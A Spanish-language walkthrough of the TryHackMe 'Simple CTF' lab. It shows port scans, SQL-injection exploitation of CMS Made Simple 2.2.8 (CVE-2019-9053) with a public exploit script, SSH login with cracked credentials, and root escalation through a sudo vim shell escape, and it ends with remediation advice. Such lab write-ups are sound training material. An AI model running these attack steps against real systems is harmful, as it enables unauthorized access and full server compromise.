# SimpleCTF

**Autor:** Alexis Sanchez  
**Fecha:** 10 de octubre de 2026  
**Dificultad:** Fácil  
**Sistema Operativo:** Linux  

---

## Introduccion

<h3><strong>TL;DR</strong></h3><p>Se obtuvo acceso inicial mediante la explotación de la <code>cve-2019-9053</code> para obtener el usuario y la contraseña de un SSH, al iniciar sesion y el reconocimiento inicial se detecto el binario vulnerable <code>usr/bin/vim</code> mediante <code>sudo -l</code> obteniendo acceso root mediante vim -c ':!/bin/sh'</p><h3>Contexto</h3><p>TryHackMe Simple CTF</p>

---

## Enumeración Inicial

<pre><code>Nota: la IP de la máquina víctima cambió entre sesiones (la VM se reinició varias veces durante la práctica). Todas las referencias se normalizan a &lt;TARGET_IP&gt;.</code></pre><h3><strong>Escaneo de Puertos</strong></h3><p>Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:</p><pre><code>nmap -Pn -p- --open -sS --min-rate 5000 -vvv -n &lt;TARGET_IP&gt;</code></pre><pre><code>PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 62
80/tcp   open  http         syn-ack ttl 62
2222/tcp open  EtherNetIP-1 syn-ack ttl 62</code></pre><h3>How many services are running under port 1000?</h3><p>R: 2</p><h3>What is running on the higher port?</h3><p>SSH</p><h3><strong>Escaneo de Servicios</strong></h3><pre><code>nmap -Pn -p &lt;OPEN_PORTs&gt; -sCV &lt;TARGET_IP&gt;</code></pre><pre><code>PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:&lt;TARGET_IP&gt;
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><p>Revisando la IP en un navegador podemos ver una pagina con la pagina default de Apache2</p>

---

## Enumeración Web

<h3>Reconocimiento de Directorios</h3><pre><code class="language-bash">gobuster dir -u http://&lt;TARGET_IP&gt; -w /usr/share/wordlists/dirb/common.txt</code></pre><h3>Directorios Interesantes:</h3><ul><li><p>/simple (Status: 301) [Size: 313] [--&gt; &lt;TARGET_IP&gt;/simple]</p></li></ul><p>revisando la pagina en la parte inferior podemos encontrar el servicio que esta corriendo: <strong>This site is powered by CMS Made Simple version 2.2.8</strong></p><h3>Análisis de Vulnerabilidades</h3><p>Despues de una busqueda sobre la version encontramos que la version del servicio cuenta con un CVE registrado</p><h3>CVE-2019-9053 — Inyección SQL</h3><p>CVE-2019-9053 es una vulnerabilidad de inyección SQL ciega basada en tiempo que afecta a CMS Made Simple 2.2.8. Permite a un atacante no autenticado inyectar consultas SQL a través del módulo News y potencialmente extraer información sensible de la base de datos, como nombres de usuario, hashes de contraseñas y salts. La vulnerabilidad aprovecha las diferencias en los tiempos de respuesta del servidor para inferir los datos de la base de datos carácter por carácter.</p><h3>Respondiendo a las preguntas</h3><p>What's the CVE you're using against the application?</p><p><strong>CVE-2019-9053</strong></p><p>To what kind of vulnerability is the application vulnerable?</p><p><strong>SQLi</strong></p>

---

## Explotación

<h2>Explotación</h2><h3>Vector de Ataque Principal</h3><p>Vulnerabilidad explotada: [SQL Injection] Severidad: [Critica] CVE: [cve-2019-9053]</p><h3>Pasos de Explotación</h3><h4>1. Identificación de la Vulnerabilidad</h4><p>Despues de una busqueda se encontro que CMS Made Simple version 2.2.8 es vulnerable y registrado por la cve-2019-9053</p><h4>2. Exploit</h4><p>Exploit obtenido de:</p><pre><code>https://www.exploit-db.com/exploits/46635</code></pre><h4>3. Ejecución del Exploit</h4><p><strong>Ejecutar exploit:</strong></p><pre><code class="language-bash">python2 ./poc2.py -u http://&lt;TARGET_IP&gt;/simple/ -w /usr/share/wordlists/rockyou.txt -c

[+] Salt for password found: 1dac0********
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f44******
[+] Password cracked: s******</code></pre><p>Con esto se puede responder a la siguiente pregunta "What's the password?" y Where can you login with the details obtained?</p><p><strong>User flag:</strong></p><p>Teniendo el usuario y la contraseña podemos iniciar sesion mediante SSH por el puerto 2222</p><pre><code>ssh mitch@&lt;TARGET_IP&gt; -p 2222
$ ls
user.txt
$ cat user.txt  
G00dxxxxxxxx</code></pre><h3>Acceso Inicial Obtenido</h3><ul><li><p>Usuario: [mitch]</p></li><li><p>Shell tipo: [sh]</p></li><li><p>Directorio inicial: [/home/user/mitch]</p></li></ul>

---

## Escalada de Privilegios

<h2>Escalada de Privilegios</h2><h3>Enumeración del Sistema</h3><p><strong>Información básica del sistema:</strong></p><pre><code class="language-bash">uname -a
cat /etc/os-release
id
sudo -l</code></pre><p>encontramos como mas interesante lo arrojado por</p><pre><code>$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim</code></pre><h3>Explotación Exitosa</h3><p>Método utilizado: [Sudoers]</p><p><strong>Comando/script utilizado para escalar:</strong></p><pre><code class="language-bash">sudo vim -c ':!/bin/sh'</code></pre><p><strong>Verificación de root:</strong></p><pre><code class="language-bash">id
whoami
cat /root/root.txt
W3ll dxxxxxxxxxxx</code></pre><p>Root obtenido</p>

---

## Resumen Final

<h3>Impacto</h3><p>La cadena de compromiso combina dos fallas independientes que, juntas, llevan de cero a root sin necesidad de exploits de kernel. Primero, un CMS desactualizado (CMS Made Simple 2.2.8) con una inyección SQL conocida (CVE-2019-9053) permitió extraer credenciales completas de la base de datos — usuario, hash y salt — sin autenticación previa. Segundo, una vez dentro como <code>mitch</code>, un permiso <code>sudo</code> mal configurado (<code>NOPASSWD: /usr/bin/vim</code>) permitió escalar a root de forma trivial, ya que vim permite ejecutar comandos de shell desde su propio editor. En un entorno real, esto representa un compromiso total del servidor partiendo únicamente de software sin parchear y una política de sudoers demasiado permisiva — ninguno de los dos problemas requiere habilidades avanzadas para explotarse.</p><h3>Remediación</h3><ul><li><p>Actualizar CMS Made Simple a una versión parcheada (o migrar a un CMS con soporte activo) para cerrar la vulnerabilidad CVE-2019-9053.</p></li><li><p>Sanitizar y usar consultas parametrizadas en el módulo News para prevenir inyección SQL, independientemente de la versión del CMS.</p></li><li><p>Revisar y restringir los permisos de <code>sudoers</code>: nunca otorgar <code>NOPASSWD</code> a binarios que permitan escape de shell (vim, less, more, nano con plugins, etc.) — GTFOBins documenta decenas de binarios comunes con este mismo riesgo.</p></li><li><p>Aplicar una política de contraseñas robusta; la contraseña de <code>mitch</code> fue crackeable con <code>rockyou.txt</code>, lo que indica que no se siguió ningún estándar de complejidad.</p></li><li><p>Deshabilitar el acceso FTP anónimo si no es estrictamente necesario para la operación del servicio.</p></li></ul><h3>Lecciones aprendidas</h3><ul><li><p>Identificar la versión exacta de un CMS/software expuesto (visible incluso en el footer de la página) es, muchas veces, todo lo que se necesita para encontrar un exploit público ya documentado — no todo ataque requiere desarrollo propio.</p></li><li><p><code>sudo -l</code> debería ser de los primeros comandos a ejecutar tras obtener cualquier shell; en este caso reveló la ruta de escalada completa en una sola línea.</p></li><li><p>GTFOBins es una referencia clave para reconocer de inmediato qué binarios con permisos elevados (SUID o sudoers) son explotables — vale la pena memorizar los más comunes (vim, find, awk, python, etc.).</p></li></ul><h3>Conclusión</h3><p>SimpleCTF es un buen ejercicio para practicar el flujo completo de explotación de una vulnerabilidad pública real (no simulada) de principio a fin: desde identificar la versión de un servicio, buscar su CVE correspondiente, ejecutar un exploit existente, hasta reconocer un vector de escalada de privilegios clásico documentado en GTFOBins. A diferencia de Basic Penetration Testing, aquí la dificultad no está en conectar pistas dispersas, sino en saber dónde y cómo buscar explotación pública para una versión de software específica — una habilidad igual de importante en el mundo real.</p>

